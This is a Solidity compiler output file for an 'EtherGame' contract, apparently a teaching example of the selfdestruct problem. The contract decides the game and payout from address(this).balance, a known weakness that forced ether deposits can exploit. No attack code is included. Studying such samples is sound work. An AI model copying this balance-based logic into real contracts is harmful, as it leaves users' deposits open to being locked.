{
	"contracts/SelfDestructPrblem.sol": {
		"EtherGame": {
			"abi": [
				{
					"inputs": [],
					"name": "claimReward",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "deposit",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "targetAmount",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "winner",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contracts/SelfDestructPrblem.sol\":62:694  contract EtherGame {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/SelfDestructPrblem.sol\":115:122  7 ether */\n  0x6124fee993bc0000\n    /* \"contracts/SelfDestructPrblem.sol\":88:122  uint public targetAmount = 7 ether */\n  0x00\n  sstore\n    /* \"contracts/SelfDestructPrblem.sol\":62:694  contract EtherGame {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/SelfDestructPrblem.sol\":62:694  contract EtherGame {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x953b8fb8\n      eq\n      tag_2\n      jumpi\n      dup1\n      0xb88a802f\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xd0e30db0\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xdfbf53ae\n      eq\n      tag_5\n      jumpi\n    tag_1:\n      0x00\n      dup1\n      revert\n        /* \"contracts/SelfDestructPrblem.sol\":88:122  uint public targetAmount = 7 ether */\n    tag_2:\n      callvalue\n      dup1\n      iszero\n      tag_6\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_6:\n      pop\n      tag_7\n      sload(0x00)\n      dup2\n      jump\n    tag_7:\n      mload(0x40)\n        /* \"#utility.yul\":160:185   */\n      swap1\n      dup2\n      mstore\n        /* \"#utility.yul\":148:150   */\n      0x20\n        /* \"#utility.yul\":133:151   */\n      add\n        /* \"contracts/SelfDestructPrblem.sol\":88:122  uint public targetAmount = 7 ether */\n    tag_9:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/SelfDestructPrblem.sol\":473:691  function claimReward() public {... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_11\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_11:\n      pop\n      tag_12\n      tag_13\n      jump\t// in\n    tag_12:\n      stop\n        /* \"contracts/SelfDestructPrblem.sol\":159:465  function deposit() public payable {... */\n    tag_4:\n      tag_12\n      tag_15\n      jump\t// in\n        /* \"contracts/SelfDestructPrblem.sol\":129:150  address public winner */\n    tag_5:\n      callvalue\n      dup1\n      iszero\n      tag_16\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_16:\n      pop\n      sload(0x01)\n      tag_17\n      swap1\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      dup2\n      jump\n    tag_17:\n      mload(0x40)\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"#utility.yul\":360:392   */\n      swap1\n      swap2\n      and\n        /* \"#utility.yul\":342:393   */\n      dup2\n      mstore\n        /* \"#utility.yul\":330:332   */\n      0x20\n        /* \"#utility.yul\":315:333   */\n      add\n        /* \"contracts/SelfDestructPrblem.sol\":129:150  address public winner */\n      tag_9\n        /* \"#utility.yul\":196:399   */\n      jump\n        /* \"contracts/SelfDestructPrblem.sol\":473:691  function claimReward() public {... */\n    tag_13:\n        /* \"contracts/SelfDestructPrblem.sol\":536:542  winner */\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x01))\n        /* \"contracts/SelfDestructPrblem.sol\":522:532  msg.sender */\n      caller\n        /* \"contracts/SelfDestructPrblem.sol\":522:542  msg.sender == winner */\n      eq\n        /* \"contracts/SelfDestructPrblem.sol\":514:557  require(msg.sender == winner, \"Not winner\") */\n      tag_22\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":606:608   */\n      0x20\n        /* \"contracts/SelfDestructPrblem.sol\":514:557  require(msg.sender == winner, \"Not winner\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":588:609   */\n      mstore\n        /* \"#utility.yul\":645:647   */\n      0x0a\n        /* \"#utility.yul\":625:643   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":618:648   */\n      mstore\n      shl(0xb1, 0x2737ba103bb4b73732b9)\n        /* \"#utility.yul\":664:682   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":657:697   */\n      mstore\n        /* \"#utility.yul\":714:732   */\n      0x64\n      add\n        /* \"contracts/SelfDestructPrblem.sol\":514:557  require(msg.sender == winner, \"Not winner\") */\n    tag_23:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_22:\n        /* \"contracts/SelfDestructPrblem.sol\":586:635  msg.sender.call{value: address(this).balance}(\"\") */\n      mload(0x40)\n        /* \"contracts/SelfDestructPrblem.sol\":571:580  bool sent */\n      0x00\n      swap1\n        /* \"contracts/SelfDestructPrblem.sol\":586:596  msg.sender */\n      caller\n      swap1\n        /* \"contracts/SelfDestructPrblem.sol\":609:630  address(this).balance */\n      selfbalance\n      swap1\n        /* \"contracts/SelfDestructPrblem.sol\":571:580  bool sent */\n      dup4\n        /* \"contracts/SelfDestructPrblem.sol\":586:635  msg.sender.call{value: address(this).balance}(\"\") */\n      dup2\n        /* \"contracts/SelfDestructPrblem.sol\":571:580  bool sent */\n      dup2\n        /* \"contracts/SelfDestructPrblem.sol\":586:635  msg.sender.call{value: address(this).balance}(\"\") */\n      dup2\n        /* \"contracts/SelfDestructPrblem.sol\":609:630  address(this).balance */\n      dup6\n        /* \"contracts/SelfDestructPrblem.sol\":586:596  msg.sender */\n      dup8\n        /* \"contracts/SelfDestructPrblem.sol\":586:635  msg.sender.call{value: address(this).balance}(\"\") */\n      gas\n      call\n      swap3\n      pop\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_29\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_28)\n    tag_29:\n      0x60\n      swap2\n      pop\n    tag_28:\n      pop\n        /* \"contracts/SelfDestructPrblem.sol\":570:635  (bool sent, ) = msg.sender.call{value: address(this).balance}(\"\") */\n      pop\n      swap1\n      pop\n        /* \"contracts/SelfDestructPrblem.sol\":654:658  sent */\n      dup1\n        /* \"contracts/SelfDestructPrblem.sol\":646:683  require(sent, \"Failed to send Ether\") */\n      tag_30\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":1155:1157   */\n      0x20\n        /* \"contracts/SelfDestructPrblem.sol\":646:683  require(sent, \"Failed to send Ether\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":1137:1158   */\n      mstore\n        /* \"#utility.yul\":1194:1196   */\n      0x14\n        /* \"#utility.yul\":1174:1192   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":1167:1197   */\n      mstore\n      shl(0x61, 0x2330b4b632b2103a379039b2b7321022ba3432b9)\n        /* \"#utility.yul\":1213:1231   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":1206:1256   */\n      mstore\n        /* \"#utility.yul\":1273:1291   */\n      0x64\n      add\n        /* \"contracts/SelfDestructPrblem.sol\":646:683  require(sent, \"Failed to send Ether\") */\n      tag_23\n        /* \"#utility.yul\":953:1297   */\n      jump\n        /* \"contracts/SelfDestructPrblem.sol\":646:683  require(sent, \"Failed to send Ether\") */\n    tag_30:\n        /* \"contracts/SelfDestructPrblem.sol\":503:691  {... */\n      pop\n        /* \"contracts/SelfDestructPrblem.sol\":473:691  function claimReward() public {... */\n      jump\t// out\n        /* \"contracts/SelfDestructPrblem.sol\":159:465  function deposit() public payable {... */\n    tag_15:\n        /* \"contracts/SelfDestructPrblem.sol\":212:221  msg.value */\n      callvalue\n        /* \"contracts/SelfDestructPrblem.sol\":225:232  1 ether */\n      0x0de0b6b3a7640000\n        /* \"contracts/SelfDestructPrblem.sol\":212:232  msg.value == 1 ether */\n      eq\n        /* \"contracts/SelfDestructPrblem.sol\":204:262  require(msg.value == 1 ether, \"You can only send 1 Ether\") */\n      tag_34\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":1504:1506   */\n      0x20\n        /* \"contracts/SelfDestructPrblem.sol\":204:262  require(msg.value == 1 ether, \"You can only send 1 Ether\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":1486:1507   */\n      mstore\n        /* \"#utility.yul\":1543:1545   */\n      0x19\n        /* \"#utility.yul\":1523:1541   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":1516:1546   */\n      mstore\n        /* \"#utility.yul\":1582:1609   */\n      0x596f752063616e206f6e6c792073656e64203120457468657200000000000000\n        /* \"#utility.yul\":1562:1580   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":1555:1610   */\n      mstore\n        /* \"#utility.yul\":1627:1645   */\n      0x64\n      add\n        /* \"contracts/SelfDestructPrblem.sol\":204:262  require(msg.value == 1 ether, \"You can only send 1 Ether\") */\n      tag_23\n        /* \"#utility.yul\":1302:1651   */\n      jump\n        /* \"contracts/SelfDestructPrblem.sol\":204:262  require(msg.value == 1 ether, \"You can only send 1 Ether\") */\n    tag_34:\n        /* \"contracts/SelfDestructPrblem.sol\":275:287  uint balance */\n      0x00\n        /* \"contracts/SelfDestructPrblem.sol\":341:353  targetAmount */\n      sload\n        /* \"contracts/SelfDestructPrblem.sol\":290:311  address(this).balance */\n      selfbalance\n      swap1\n        /* \"contracts/SelfDestructPrblem.sol\":330:353  balance <= targetAmount */\n      dup2\n      gt\n      iszero\n        /* \"contracts/SelfDestructPrblem.sol\":322:370  require(balance <= targetAmount, \"Game is over\") */\n      tag_37\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":1858:1860   */\n      0x20\n        /* \"contracts/SelfDestructPrblem.sol\":322:370  require(balance <= targetAmount, \"Game is over\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":1840:1861   */\n      mstore\n        /* \"#utility.yul\":1897:1899   */\n      0x0c\n        /* \"#utility.yul\":1877:1895   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":1870:1900   */\n      mstore\n      shl(0xa1, 0x23b0b6b29034b99037bb32b9)\n        /* \"#utility.yul\":1916:1934   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":1909:1951   */\n      mstore\n        /* \"#utility.yul\":1968:1986   */\n      0x64\n      add\n        /* \"contracts/SelfDestructPrblem.sol\":322:370  require(balance <= targetAmount, \"Game is over\") */\n      tag_23\n        /* \"#utility.yul\":1656:1992   */\n      jump\n        /* \"contracts/SelfDestructPrblem.sol\":322:370  require(balance <= targetAmount, \"Game is over\") */\n    tag_37:\n        /* \"contracts/SelfDestructPrblem.sol\":398:410  targetAmount */\n      sload(0x00)\n        /* \"contracts/SelfDestructPrblem.sol\":387:394  balance */\n      dup2\n        /* \"contracts/SelfDestructPrblem.sol\":387:410  balance == targetAmount */\n      sub\n        /* \"contracts/SelfDestructPrblem.sol\":383:458  if (balance == targetAmount) {... */\n      tag_30\n      jumpi\n        /* \"contracts/SelfDestructPrblem.sol\":427:433  winner */\n      0x01\n        /* \"contracts/SelfDestructPrblem.sol\":427:446  winner = msg.sender */\n      dup1\n      sload\n      not(sub(shl(0xa0, 0x01), 0x01))\n      and\n        /* \"contracts/SelfDestructPrblem.sol\":436:446  msg.sender */\n      caller\n        /* \"contracts/SelfDestructPrblem.sol\":427:446  winner = msg.sender */\n      or\n      swap1\n      sstore\n        /* \"contracts/SelfDestructPrblem.sol\":193:465  {... */\n      pop\n        /* \"contracts/SelfDestructPrblem.sol\":159:465  function deposit() public payable {... */\n      jump\t// out\n\n    auxdata: 0xa264697066735822122034205799ed3fe3af50765ebc66e8305e814b84eecb0569e88df7b4ccd66af4aa64736f6c634300080d0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "6080604052676124fee993bc000060005534801561001c57600080fd5b506102908061002c6000396000f3fe60806040526004361061003f5760003560e01c8063953b8fb814610044578063b88a802f1461006d578063d0e30db014610084578063dfbf53ae1461008c575b600080fd5b34801561005057600080fd5b5061005a60005481565b6040519081526020015b60405180910390f35b34801561007957600080fd5b506100826100c4565b005b6100826101a2565b34801561009857600080fd5b506001546100ac906001600160a01b031681565b6040516001600160a01b039091168152602001610064565b6001546001600160a01b031633146101105760405162461bcd60e51b815260206004820152600a6024820152692737ba103bb4b73732b960b11b60448201526064015b60405180910390fd5b604051600090339047908381818185875af1925050503d8060008114610152576040519150601f19603f3d011682016040523d82523d6000602084013e610157565b606091505b505090508061019f5760405162461bcd60e51b81526020600482015260146024820152732330b4b632b2103a379039b2b7321022ba3432b960611b6044820152606401610107565b50565b34670de0b6b3a7640000146101f95760405162461bcd60e51b815260206004820152601960248201527f596f752063616e206f6e6c792073656e642031204574686572000000000000006044820152606401610107565b600054479081111561023c5760405162461bcd60e51b815260206004820152600c60248201526b23b0b6b29034b99037bb32b960a11b6044820152606401610107565b600054810361019f57600180546001600160a01b031916331790555056fea264697066735822122034205799ed3fe3af50765ebc66e8305e814b84eecb0569e88df7b4ccd66af4aa64736f6c634300080d0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH8 0x6124FEE993BC0000 PUSH1 0x0 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x1C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x290 DUP1 PUSH2 0x2C PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x3F JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x953B8FB8 EQ PUSH2 0x44 JUMPI DUP1 PUSH4 0xB88A802F EQ PUSH2 0x6D JUMPI DUP1 PUSH4 0xD0E30DB0 EQ PUSH2 0x84 JUMPI DUP1 PUSH4 0xDFBF53AE EQ PUSH2 0x8C JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x50 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x5A PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x79 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x82 PUSH2 0xC4 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x82 PUSH2 0x1A2 JUMP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x98 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 SLOAD PUSH2 0xAC SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x64 JUMP JUMPDEST PUSH1 0x1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND CALLER EQ PUSH2 0x110 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xA PUSH1 0x24 DUP3 ADD MSTORE PUSH10 0x2737BA103BB4B73732B9 PUSH1 0xB1 SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x0 SWAP1 CALLER SWAP1 SELFBALANCE SWAP1 DUP4 DUP2 DUP2 DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x152 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x157 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x19F JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x14 PUSH1 0x24 DUP3 ADD MSTORE PUSH20 0x2330B4B632B2103A379039B2B7321022BA3432B9 PUSH1 0x61 SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x107 JUMP JUMPDEST POP JUMP JUMPDEST CALLVALUE PUSH8 0xDE0B6B3A7640000 EQ PUSH2 0x1F9 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x19 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x596F752063616E206F6E6C792073656E64203120457468657200000000000000 PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x107 JUMP JUMPDEST PUSH1 0x0 SLOAD SELFBALANCE SWAP1 DUP2 GT ISZERO PUSH2 0x23C JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xC PUSH1 0x24 DUP3 ADD MSTORE PUSH12 0x23B0B6B29034B99037BB32B9 PUSH1 0xA1 SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x107 JUMP JUMPDEST PUSH1 0x0 SLOAD DUP2 SUB PUSH2 0x19F JUMPI PUSH1 0x1 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND CALLER OR SWAP1 SSTORE POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 CALLVALUE KECCAK256 JUMPI SWAP10 0xED EXTCODEHASH 0xE3 0xAF POP PUSH23 0x5EBC66E8305E814B84EECB0569E88DF7B4CCD66AF4AA64 PUSH20 0x6F6C634300080D00330000000000000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "131200",
						"executionCost": "22283",
						"totalCost": "153483"
					},
					"external": {
						"claimReward()": "infinite",
						"deposit()": "28657",
						"targetAmount()": "2262",
						"winner()": "2381"
					}
				},
				"methodIdentifiers": {
					"claimReward()": "b88a802f",
					"deposit()": "d0e30db0",
					"targetAmount()": "953b8fb8",
					"winner()": "dfbf53ae"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 4,
						"contract": "contracts/SelfDestructPrblem.sol:EtherGame",
						"label": "targetAmount",
						"offset": 0,
						"slot": "0",
						"type": "t_uint256"
					},
					{
						"astId": 6,
						"contract": "contracts/SelfDestructPrblem.sol:EtherGame",
						"label": "winner",
						"offset": 0,
						"slot": "1",
						"type": "t_address"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}